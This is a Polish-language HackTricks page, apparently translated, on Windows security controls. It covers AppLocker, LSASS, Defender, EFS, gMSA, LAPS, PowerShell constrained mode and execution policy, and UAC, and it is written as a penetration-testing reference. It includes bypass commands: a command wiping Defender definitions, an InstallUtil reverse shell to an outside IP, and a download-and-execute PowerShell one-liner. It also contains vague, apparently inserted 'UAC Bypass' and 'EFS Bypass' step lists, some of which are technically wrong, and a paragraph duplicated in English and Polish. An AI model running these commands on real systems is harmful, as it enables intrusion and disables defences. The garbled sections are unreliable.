# Kontrole bezpieczeństwa systemu Windows

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Polityka AppLocker

Biała lista aplikacji to lista zatwierdzonych aplikacji lub plików wykonywalnych, które są dozwolone na systemie. Celem jest ochrona środowiska przed szkodliwym oprogramowaniem i niezatwierdzonym oprogramowaniem, które nie jest zgodne z określonymi potrzebami biznesowymi organizacji.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) to rozwiązanie **białej listy aplikacji** firmy Microsoft, które umożliwia administratorom systemu kontrolę nad **które aplikacje i pliki mogą uruchamiać użytkownicy**. Zapewnia **dokładną kontrolę** nad plikami wykonywalnymi, skryptami, plikami instalatora systemu Windows, plikami DLL, aplikacjami pakietowymi i instalatorami pakietów aplikacji.\
Często organizacje **blokują cmd.exe i PowerShell.exe** oraz dostęp do określonych katalogów, **ale wszystko to można ominąć**.

### Sprawdź

Sprawdź, które pliki/rozszerzenia są na czarnej/białej liście:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ten ścieżka rejestru zawiera konfiguracje i zasady stosowane przez AppLocker, umożliwiając przeglądanie obecnie obowiązującego zestawu reguł na systemie:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`


### Ominięcie

* Przydatne **folderu z uprawnieniami do zapisu** do ominięcia zasad AppLocker: Jeśli AppLocker pozwala na wykonanie czegokolwiek wewnątrz `C:\Windows\System32` lub `C:\Windows`, istnieją **foldery z uprawnieniami do zapisu**, które można użyć do **ominięcia tego**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Powszechnie **zaufane** binaria [**"LOLBAS"**](https://lolbas-project.github.io/) mogą być również przydatne do omijania AppLocker.
* **Słabo napisane reguły mogą również zostać ominięte**
* Na przykład, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, można utworzyć **folder o nazwie `allowed`** w dowolnym miejscu i będzie on dozwolony.
* Organizacje często skupiają się na **blokowaniu pliku wykonywalnego `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ale zapominają o **innych** [**lokalizacjach plików wykonywalnych PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations), takich jak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` lub `PowerShell_ISE.exe`.
* **Wymuszenie DLL jest bardzo rzadko włączane** ze względu na dodatkowe obciążenie, jakie może wprowadzić dla systemu, oraz ilość testów wymaganych do zapewnienia, że nic się nie popsuje. Dlatego używanie **DLL jako tylnych drzwi pomoże ominąć AppLocker**.
* Można użyć narzędzi [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonać kod Powershell** w dowolnym procesie i ominąć AppLocker. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Przechowywanie poświadczeń

### Security Accounts Manager (SAM)

Lokalne poświadczenia są przechowywane w tym pliku, hasła są zahaszowane.

### Local Security Authority (LSA) - LSASS

**Poświadczenia** (zahaszowane) są **zapisywane** w **pamięci** tego podsystemu ze względu na funkcję Single Sign-On.\
**LSA** zarządza lokalną **polityką bezpieczeństwa** (polityka hasła, uprawnienia użytkowników...), **uwierzytelnianiem**, **tokenami dostępu**...\
LSA będzie sprawdzać podane poświadczenia wewnątrz pliku **SAM** (dla lokalnego logowania) i **komunikować się** z kontrolerem domeny w celu uwierzytelnienia użytkownika domeny.

**Poświadczenia** są **zapisywane** wewnątrz procesu LSASS: bilety Kerberos, hashe NT i LM, łatwo odszyfrowane hasła.

### Sekrety LSA

LSA może zapisywać w dysku niektóre poświadczenia:

* Hasło konta komputera Active Directory (niedostępny kontroler domeny).
* Hasła kont usług systemu Windows
* Hasła dla zaplanowanych zadań
* Więcej (hasło aplikacji IIS...)

### NTDS.dit

Jest to baza danych Active Directory. Jest obecna tylko w kontrolerach domeny.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) to program antywirusowy dostępny w systemach Windows 10 i Windows 11, a także w wersjach systemu Windows Server. Blokuje on popularne narzędzia do testów penetracyjnych, takie jak **`WinPEAS`**. Istnieją jednak sposoby na **ominięcie tych zabezpieczeń**.

### Sprawdzenie

Aby sprawdzić **status** programu **Defender**, można wykonać polecenie PS **`Get-MpComputerStatus`** (sprawdź wartość **`RealTimeProtectionEnabled`**, aby dowiedzieć się, czy jest aktywny):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Aby go wyliczyć, można również uruchomić:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Szyfrowany system plików (EFS)

EFS zabezpiecza pliki poprzez szyfrowanie, wykorzystując **klucz symetryczny** znany jako **Klucz Szyfrowania Plików (FEK)**. Ten klucz jest szyfrowany za pomocą **klucza publicznego** użytkownika i przechowywany w alternatywnym strumieniu danych $EFS zaszyfrowanego pliku. W przypadku konieczności odszyfrowania, odpowiadający **klucz prywatny** certyfikatu cyfrowego użytkownika jest używany do odszyfrowania FEK z strumienia $EFS. Więcej szczegółów można znaleźć [tutaj](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariusze odszyfrowywania bez inicjacji przez użytkownika** obejmują:

- Gdy pliki lub foldery są przenoszone do systemu plików nieobsługującego EFS, takiego jak [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), są automatycznie odszyfrowywane.
- Zaszyfrowane pliki wysyłane przez sieć za pomocą protokołu SMB/CIFS są odszyfrowywane przed transmisją.

Ta metoda szyfrowania umożliwia **transparentny dostęp** do zaszyfrowanych plików dla właściciela. Jednak zmiana hasła właściciela i zalogowanie się nie pozwoli na odszyfrowanie.

**Podsumowanie**:
- EFS używa symetrycznego FEK, który jest szyfrowany za pomocą klucza publicznego użytkownika.
- Odszyfrowanie polega na użyciu klucza prywatnego użytkownika do uzyskania dostępu do FEK.
- Automatyczne odszyfrowywanie zachodzi w określonych warunkach, takich jak kopiowanie do FAT32 lub transmisja sieciowa.
- Zaszyfrowane pliki są dostępne dla właściciela bez dodatkowych kroków.

### Sprawdzanie informacji o EFS

Sprawdź, czy **użytkownik** **korzystał** z tej **usługi**, sprawdzając, czy istnieje ten ścieżka: `C:\users\<nazwa_użytkownika>\appdata\roaming\Microsoft\Protect`

Sprawdź, **kto** ma **dostęp** do pliku, używając `cipher /c \<plik>\`
Możesz również użyć `cipher /e` i `cipher /d` wewnątrz folderu, aby **zaszyfrować** i **odszyfrować** wszystkie pliki.

### Odszyfrowywanie plików EFS

#### Będąc Systemem Autoryzacyjnym

Ten sposób wymaga, aby **użytkownik ofiary** **uruchamiał** proces wewnątrz hosta. Jeśli tak jest, używając sesji `meterpreter`, możesz podrobić token procesu użytkownika (`impersonate_token` z `incognito`). Lub po prostu możesz `migrate` do procesu użytkownika.

#### Znając hasło użytkownika

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Zarządzane grupowe konta usług (gMSA)

Microsoft opracował **Zarządzane grupowe konta usług (gMSA)**, aby ułatwić zarządzanie kontami usług w infrastrukturach IT. W przeciwieństwie do tradycyjnych kont usług, które często mają włączoną opcję "**Hasło nigdy nie wygasa**", gMSA oferuje bardziej bezpieczne i zarządzalne rozwiązanie:

- **Automatyczne zarządzanie hasłami**: gMSA używają złożonego hasła o długości 240 znaków, które automatycznie zmienia się zgodnie z polityką domeny lub komputera. Proces ten jest obsługiwany przez Usługę Dystrybucji Kluczy (KDC) firmy Microsoft, eliminując konieczność ręcznej aktualizacji hasła.
- **Wzmocnione zabezpieczenia**: Te konta są odporne na blokady i nie mogą być używane do interaktywnego logowania, co zwiększa ich bezpieczeństwo.
- **Wsparcie dla wielu hostów**: gMSA mogą być udostępniane na wielu hostach, co czyni je idealnymi dla usług działających na wielu serwerach.
- **Możliwość uruchamiania zaplanowanych zadań**: W przeciwieństwie do zarządzanych kont usług, gMSA obsługują uruchamianie zaplanowanych zadań.
- **Uproszczone zarządzanie SPN**: System automatycznie aktualizuje nazwę głównej usługi (SPN) w przypadku zmian w szczegółach sAMaccount lub nazwie DNS komputera, upraszczając zarządzanie SPN.

Hasła dla gMSA są przechowywane w właściwości LDAP _**msDS-ManagedPassword**_ i są automatycznie resetowane co 30 dni przez kontrolery domeny (DC). To hasło, zaszyfrowany blok danych znany jako [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), może być pobrane tylko przez upoważnionych administratorów i serwery, na których zainstalowane są gMSA, zapewniając bezpieczne środowisko. Aby uzyskać dostęp do tych informacji, wymagane jest zabezpieczone połączenie, takie jak LDAPS, lub połączenie musi być uwierzytelnione za pomocą 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Możesz odczytać to hasło za pomocą [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
**[Znajdź więcej informacji w tym poście](https://cube0x0.github.io/Relaying-for-gMSA/)**

Sprawdź również tę [stronę internetową](https://cube0x0.github.io/Relaying-for-gMSA/) dotyczącą wykonywania ataku **przekazywania NTLM** w celu **odczytania** hasła **gMSA**.

## LAPS

Rozwiązanie **Local Administrator Password Solution (LAPS)**, dostępne do pobrania z [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), umożliwia zarządzanie hasłami lokalnych administratorów. Te hasła, które są **losowe**, unikalne i **regularnie zmieniane**, są przechowywane centralnie w Active Directory. Dostęp do tych haseł jest ograniczony za pomocą listy kontroli dostępu (ACL) dla uprawnionych użytkowników. Przy odpowiednich uprawnieniach umożliwia odczyt haseł lokalnych administratorów.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Tryb ograniczonego języka

Tryb [**ograniczonego języka PowerShell**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **blokuje wiele funkcji** potrzebnych do efektywnego korzystania z PowerShell, takich jak blokowanie obiektów COM, zezwalanie tylko na zatwierdzone typy .NET, przepływy pracy oparte na XAML, klasy PowerShell i wiele innych.

### **Sprawdź**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Ominięcie

#### UAC Bypass

##### Metoda 1: Wykorzystanie złośliwego pliku wykonywalnego

1. Przygotuj złośliwy plik wykonywalny, który zostanie uruchomiony z uprawnieniami administratora.
2. Utwórz zadanie zaplanowane, które uruchomi ten plik z uprawnieniami administratora.
3. Zadanie zaplanowane zostanie uruchomione automatycznie, a UAC zostanie ominięte.

##### Metoda 2: Wykorzystanie złośliwego pliku wsadowego

1. Przygotuj złośliwy plik wsadowy, który zostanie uruchomiony z uprawnieniami administratora.
2. Utwórz skrót do tego pliku wsadowego.
3. Zmień właściwości skrótu tak, aby uruchamiał się z uprawnieniami administratora.
4. Uruchom skrót, a UAC zostanie ominięte.

##### Metoda 3: Wykorzystanie złośliwego pliku DLL

1. Przygotuj złośliwy plik DLL, który zostanie załadowany przez uprzywilejowany proces.
2. Utwórz usługę systemową, która załaduje ten plik DLL.
3. Uruchom usługę, a UAC zostanie ominięte.

#### EFS Bypass

##### Metoda 1: Wykorzystanie złośliwego pliku wsadowego

1. Przygotuj złośliwy plik wsadowy, który skopiuję zaszyfrowane pliki EFS na inną lokalizację.
2. Uruchom ten plik wsadowy z uprawnieniami administratora.
3. Skopiowane pliki EFS zostaną odszyfrowane i dostępne bez konieczności posiadania klucza EFS.

##### Metoda 2: Wykorzystanie złośliwego oprogramowania

1. Przygotuj złośliwe oprogramowanie, które będzie monitorować procesy i przechwytywać klucze EFS.
2. Gdy użytkownik odszyfrowuje plik EFS, złośliwe oprogramowanie przechwytuje klucz i zapisuje go.
3. Używając przechwyconego klucza, złośliwe oprogramowanie może odszyfrować inne pliki EFS bez konieczności posiadania oryginalnego klucza.
```powershell
#Easy bypass
Powershell -version 2
```
W obecnych wersjach systemu Windows to obejście nie zadziała, ale możesz użyć [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Aby go skompilować, możesz potrzebować** **dodać odwołanie** -> _Przeglądaj_ -> _Przeglądaj_ -> dodać `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **zmienić projekt na .Net4.5**.

#### Bezpośrednie obejście:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Odwrócony shell:

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. Reverse shells are commonly used in post-exploitation scenarios to maintain persistent access to a compromised system.

To establish a reverse shell, the attacker typically needs to exploit a vulnerability or trick the target into running a malicious script or executable. Once the connection is established, the attacker can interact with the target machine's command prompt or shell.

Reverse shells can be implemented using various techniques, such as using netcat, PowerShell, or other scripting languages. The choice of technique depends on the target machine's operating system and available tools.

It is important to note that reverse shells can be detected and blocked by security measures such as firewalls and intrusion detection systems. Therefore, attackers often use techniques to obfuscate their malicious activities and evade detection.

#### Odwrócony shell:

Odwrócony shell to rodzaj powłoki, w której maszyna docelowa inicjuje połączenie z maszyną atakującego. Pozwala to atakującemu zdalnie uzyskać dostęp do maszyny docelowej i wykonywać polecenia. Odwrócone shelle są często używane w scenariuszach po eksploatacji w celu utrzymania trwałego dostępu do skompromitowanego systemu.

Aby ustanowić odwrócony shell, atakujący zazwyczaj musi wykorzystać podatność lub oszukać cel, aby uruchomił złośliwy skrypt lub plik wykonywalny. Po ustanowieniu połączenia atakujący może interaktywnie korzystać z wiersza poleceń lub powłoki maszyny docelowej.

Odwrócone shelle można zaimplementować przy użyciu różnych technik, takich jak netcat, PowerShell lub inne języki skryptowe. Wybór techniki zależy od systemu operacyjnego maszyny docelowej i dostępnych narzędzi.

Warto zauważyć, że odwrócone shelle mogą być wykrywane i blokowane przez środki bezpieczeństwa, takie jak zapory sieciowe i systemy wykrywania włamań. Dlatego atakujący często stosują techniki maskowania swoich złośliwych działań i unikają wykrycia.
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonać kod Powershell** w dowolnym procesie i ominąć tryb ograniczony. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Polityka wykonania PS

Domyślnie jest ustawiona na **restricted**. Główne sposoby obejścia tej polityki to:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Więcej informacji można znaleźć [tutaj](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interfejs dostawcy obsługi zabezpieczeń (SSPI)

Jest to interfejs API, który może być używany do uwierzytelniania użytkowników.

SSPI będzie odpowiedzialny za znalezienie odpowiedniego protokołu dla dwóch maszyn, które chcą się komunikować. Preferowaną metodą jest Kerberos. Następnie SSPI negocjuje, który protokół uwierzytelniania zostanie użyty. Te protokoły uwierzytelniania nazywane są dostawcami obsługi zabezpieczeń (SSP) i znajdują się w postaci plików DLL w każdej maszynie z systemem Windows. Obydwie maszyny muszą obsługiwać ten sam protokół, aby móc się komunikować.

### Główne dostawcy obsługi zabezpieczeń (SSP)

* **Kerberos**: Preferowany
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** i **NTLMv2**: Ze względów zgodności
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Serwery internetowe i LDAP, hasło w formie skrótu MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL i TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Służy do negocjacji protokołu do użycia (Kerberos lub NTLM, przy czym Kerberos jest domyślny)
* %windir%\Windows\System32\lsasrv.dll

#### Negocjacja może oferować kilka metod lub tylko jedną.

## UAC - Kontrola konta użytkownika

[Kontrola konta użytkownika (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja umożliwiająca **wyświetlanie monitu o zgodę dla podniesionych uprawnień**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Uzyskaj [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
